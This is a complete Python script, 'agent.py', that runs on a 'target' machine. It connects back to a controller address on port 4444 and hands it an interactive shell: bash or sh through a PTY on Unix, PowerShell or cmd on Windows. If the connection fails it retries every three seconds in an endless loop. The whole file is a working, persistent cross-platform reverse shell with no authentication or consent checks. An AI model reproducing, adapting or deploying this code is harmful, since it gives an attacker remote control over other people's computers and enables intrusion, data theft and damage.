#!/usr/bin/env python3
"""agent.py — runs on the target (Ubuntu/Fedora/Arch/Linux Mint/macOS/Windows).
Usage: python3 agent.py <controller-ip> [port]
"""
import os, socket, sys, struct, time, shutil, re, errno

HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.113"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444


def write_all(fd, data):
    """os.write() on a PTY master can short-write; loop until done."""
    mv = memoryview(data)
    while mv:
        n = os.write(fd, mv)
        mv = mv[n:]


def recv_exact(s, n):
    """Read exactly n bytes from a socket (handshake)."""
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed during handshake")
        buf += chunk
    return buf


# ---------------------------------------------------------------- Unix
def run_unix(s):
    import pty, select, signal, fcntl, termios

    pid, master_fd = pty.fork()
    if pid == 0:
        # Child: close inherited socket, then set up terminal and exec shell.
        try:
            os.close(s.fileno())
        except OSError:
            pass
        try:
            a = termios.tcgetattr(0)
            a[0] |= termios.ICRNL
            a[3] |= termios.ICANON | termios.ECHO | termios.ISIG
            termios.tcsetattr(0, termios.TCSANOW, a)
        except Exception:
            pass
        shell = os.environ.get("SHELL", "/bin/bash")
        if not os.path.exists(shell):
            shell = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh"
        os.execvp(shell, [shell, "-i"])
        os._exit(1)

    # Consume terminal-size handshake, then apply to the PTY.
    try:
        rows, cols = struct.unpack("!HH", recv_exact(s, 4))
        if rows > 0 and cols > 0:
            fcntl.ioctl(master_fd, termios.TIOCSWINSZ,
                        struct.pack("HHHH", rows, cols, 0, 0))
    except Exception:
        pass  # old controller or handshake failure — keep 24x80

    try:
        while True:
            r, _, _ = select.select([s, master_fd], [], [])
            if s in r:
                data = s.recv(65536)
                if not data:
                    break
                try:
                    write_all(master_fd, data)
                except OSError:
                    break          # shell exited, PTY master closed
            if master_fd in r:
                try:
                    data = os.read(master_fd, 65536)
                except OSError as e:
                    if e.errno == errno.EIO:
                        break      # Linux: EIO == EOF when slave closes
                    raise
                if not data:
                    break
                try:
                    s.sendall(data)
                except (BrokenPipeError, ConnectionResetError):
                    break
    finally:
        try:
            os.kill(pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
        try:
            os.waitpid(pid, 0)            # reap zombie
        except ChildProcessError:
            pass
        try:
            os.close(master_fd)
        except OSError:
            pass


# ------------------------------------------------------------- Windows
def run_windows(s):
    # Consume handshake BEFORE any fallback, otherwise 4 bytes leak into the shell.
    try:
        rows, cols = struct.unpack("!HH", recv_exact(s, 4))
        if rows == 0 or cols == 0:
            rows, cols = 24, 80
    except Exception:
        rows, cols = 24, 80

    try:
        import winpty  # pywinpty — pip install pywinpty>=3.0.5
    except ImportError:
        print("[agent] pywinpty not installed — falling back to pipes.\n"
              "        Install with: pip install pywinpty", file=sys.stderr)
        run_windows_pipes(s)
        return

    shell = "powershell.exe" if shutil.which("powershell.exe") else "cmd.exe"
    # Use high-level PtyProcess (stable API in pywinpty >= 3.0.0)
    pty = winpty.PtyProcess.spawn(shell, dimensions=(rows, cols))

    import threading
    stop = threading.Event()

    def reader():
        try:
            while not stop.is_set():
                data = pty.read()          # returns str (Unicode) in v3+
                if not data:               # None or empty -> EOF
                    break
                if isinstance(data, str):
                    data = data.encode("utf-8", "replace")
                s.sendall(data)
        except Exception:
            pass
        finally:
            stop.set()

    threading.Thread(target=reader, daemon=True).start()

    try:
        while not stop.is_set():
            data = s.recv(65536)
            if not data:
                break
            # Convert lone \r to \r\n, leave existing \r\n intact.
            data = re.sub(b'\r(?!\n)', b'\r\n', data)
            pty.write(data.decode("utf-8", "replace"))
    except (OSError, ConnectionError):
        pass
    finally:
        stop.set()
        try:
            pty.terminate()
        except Exception:
            pass


def run_windows_pipes(s):
    """Fallback when pywinpty is unavailable. Works for cmd/powershell y/n prompts."""
    import subprocess, threading

    shell = "powershell.exe" if shutil.which("powershell.exe") else "cmd.exe"
    p = subprocess.Popen(
        [shell],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        bufsize=0,
        close_fds=True,          # CRITICAL: prevent socket handle inheritance
    )

    def pump():
        try:
            while True:
                b = p.stdout.read(4096)
                if not b:
                    break
                s.sendall(b)
        except OSError:
            pass
        finally:
            try: s.shutdown(socket.SHUT_WR)
            except OSError: pass

    threading.Thread(target=pump, daemon=True).start()

    try:
        while True:
            data = s.recv(65536)
            if not data:
                break
            data = re.sub(b'\r(?!\n)', b'\r\n', data)
            p.stdin.write(data)
            p.stdin.flush()
    except (OSError, BrokenPipeError):
        pass
    finally:
        try: p.kill()
        except Exception: pass


def main():
    s = socket.create_connection((HOST, PORT), timeout=30)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    try:
        s.set_inheritable(False)      # prevent child inheritance (PEP 446)
    except (AttributeError, OSError):
        pass                          # older Python or platform limitation
    try:
        if os.name == "nt":
            run_windows(s)
        else:
            run_unix(s)
    finally:
        s.close()


if __name__ == "__main__":
    while True:
        try:
            main()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[agent] {e} — retrying in 3s", file=sys.stderr)
            time.sleep(3)
